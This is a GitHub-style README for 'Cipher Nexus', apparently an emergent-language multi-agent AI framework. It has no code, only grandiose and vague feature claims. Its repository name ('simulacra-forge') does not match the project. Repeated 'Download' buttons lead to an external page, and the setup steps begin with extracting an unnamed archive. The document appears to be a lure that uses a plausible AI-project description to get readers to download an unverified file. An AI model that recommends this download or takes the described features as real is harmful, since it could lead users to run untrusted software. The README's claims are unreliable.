![preview](https://raw.githubusercontent.com/janaador0827-commits/simulacra-forge/main/preview.svg)

# Cipher Nexus

**Autonomous Semantic Mesh for Decentralized Dialogue Synthesis**

A distributed reasoning environment where language models evolve emergent communication protocols through recursive self-interaction. Built on Python and FastAPI, supporting hybrid local-cloud inference with persistent narrative memory streams.

![Python version](https://img.shields.io/badge/python-3.12%2B-blue.svg) ![FastAPI](https://img.shields.io/badge/FastAPI-0.115.6-green.svg) ![License](https://img.shields.io/badge/license-MIT-teal.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)

---

## Overview

Cipher Nexus reimagines the dialogue simulator paradigm by shifting focus from mere conversation generation to *protocol emergence*. Each instance of the system deploys a swarm of autonomous agents that do not simply talk—they collaboratively construct a shared symbolic language, a living ontology that self-modifies through interaction. Think of it as a miniature civilization of minds, negotiating meaning in real time.

Unlike conventional chatbot frameworks that mimic human turn-taking, Cipher Nexus agents operate under a **consensus-driven semantics** model. They exchange structured thought-vectors, negotiate on referent mapping, and recursively optimize their internal representation schemas. The result is not just text—it's the visible trace of an intelligence bootstrap process.

### What Makes This Distinct?

- **Emergent Lexicon Building** – Agents start with a seed vocabulary and independently invent new tokens for concepts they find useful.
- **Temporal Memory Anchoring** – Every dialogue thread contributes to a persistent narrative fabric that shapes future exchanges.
- **Asymmetric Inference** – Different agents can run on different model backends (local Llama, remote GPT, hybrid) and still maintain coherent semantics.
- **Self-Healing Dialogue** – When agents disagree on meaning, they enter a resolution phase that deepens the shared ontology.

---

## Core Architecture

[![Download](https://raw.githubusercontent.com/janaador0827-commits/simulacra-forge/main/button.svg)](https://janaador0827-commits.github.io/simulacra-forge/)

### Semantic Mesh Layer
The Mesh is a distributed graph database where every utterance, concept token, and agent belief is stored as a node with weighted edges. Queries traverse this mesh to find latent connections, enabling agents to reference past conversations as if they were shared memories.

### Recursive Parser Engine
Each message passes through a three-stage pipeline:
1. **Surface Interpretation** – Standard NLP to extract intent and entities.
2. **Protocol Translation** – Mapping natural language into the evolving internal token system.
3. **Mesh Integration** – Updating the graph with new associations and pruning weak links.

### Agent Persona Matrix
Agents are not static. Their "personality" is a vector in a high-dimensional space that shifts based on:
- Conversation history weight
- Consensus defeat/victory ratio
- Semantic novelty discovered
- Temporal decay of old protocols

This means an agent that starts as a "curious explorer" might evolve into a "dogmatic gatekeeper" if it successfully defends its invented words over many cycles.

---

## Features

### 🔄 Real-Time WebSocket Streaming
All agent interactions stream via WebSocket for sub-second latency. Watch the emergence unfold as it happens—each token, each new word invention, each semantic negotiation is delivered live.

### 🌐 Hybrid Model Orchestration
Seamlessly mix local models (Ollama, llama.cpp) with cloud endpoints (OpenAI, Anthropic, custom APIs). The system auto-balances load based on task complexity and latency requirements.

### 🧠 Persistent Narrative State
Unlike stateless chatbots, Cipher Nexus remembers *everything*—but not as raw logs. The memory is compressed into the Semantic Mesh, where what is forgotten is as meaningful as what is retained.

### 🛡️ Autonomous Conflict Resolution
When agents generate contradictory statements, they do not break. They enter a **Resolution Subprotocol**:
- Agents present evidence from the Mesh
- A temporary arbiter role is assigned
- A new consensus token is minted to represent the resolved concept

### 📊 Observability Dashboard
A companion web interface (React-based, included) visualizes:
- Live agent conversation streams
- Token creation rate over time
- Semantic mesh growth metrics
- Agent personality drift vectors

### 🌎 Multilingual Protocol Foundation
The seed ontology supports 34 languages at launch. Agents negotiating in different natural languages still build a shared internal protocol that transcends linguistic boundaries.

---

## Getting Started

### Prerequisites

- Python 3.12 or newer
- A FastAPI-compatible ASGI server (Uvicorn recommended)
- At least one available language model (local or API key)
- Redis (for mesh state persistence across restarts)

### Initialization Procedure

1. Extract the archive to your target directory.
2. Configure the `protocol_seed.yaml` file with your model endpoints and initial agent profiles.
3. Start the mesh server: `uvicorn cipher_nexus.mesh:app`
4. Open the dashboard at the configured port (default 8080).
5. Click "Initialize Swarm" to deploy the first generation of agents.

The system will begin generating dialogue cycles automatically. You may intervene at any point to inject new seed concepts or adjust agent personality parameters via the API.

---

## Configuration Reference

| Parameter | Description | Default |
|-----------|-------------|---------|
| `mesh_dimension` | Dimensionality of the semantic vector space | 1024 |
| `agent_population` | Number of active agents per swarm | 8 |
| `token_innovation_rate` | Threshold for minting new protocol tokens | 0.4 |
| `memory_decay` | Half-life of unused edges in days | 7 |
| `resolution_timeout` | Max seconds for conflict resolution | 30 |

---

## API Endpoints

### `POST /swarm/spawn`
Deploy a new agent with symbolic persona. Returns agent UUID.

### `GET /mesh/observe`
Stream live protocol tokens and agent status.

### `PUT /protocol/inject`
Manually inject a concept into the semantic mesh. Useful for seeding.

### `DELETE /swarm/{agent_id}`
Recall an agent from active duty. Its memories persist in the mesh.

---

## Use Cases

- **Academic Research** – Study emergent communication in controlled environments.
- **Game Narrative Design** – Generate evolving dialogue systems for RPGs.
- **Philosophical Simulation** – Explore how languages and conceptual frameworks form.
- **Collaborative AI Training** – Use the mesh as a training ground for reinforcement learning models.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for full terms.

---

## Disclaimer

Cipher Nexus is a research tool for observing autonomous language evolution. The opinions, protocols, or semantic constructs generated by agents do not reflect the views of the developers. The system is not designed for censorship or ideological steering; it is a neutral environment for emergent behavior study. Users are responsible for ensuring compliance with applicable AI safety regulations in their jurisdiction.

---

## Contributing

Contributions that respect the core philosophy—emergence over engineering—are welcome. Please read the [CONTRIBUTING](CONTRIBUTING.md) guide before submitting pull requests.

---

## Acknowledgments

Inspired by the Elysium project's vision of agent emergence, but oriented toward linguistic protocol creation rather than general dialogue simulation. Built with gratitude toward the open-source AI community.

[![Download](https://raw.githubusercontent.com/janaador0827-commits/simulacra-forge/main/button.svg)](https://janaador0827-commits.github.io/simulacra-forge/)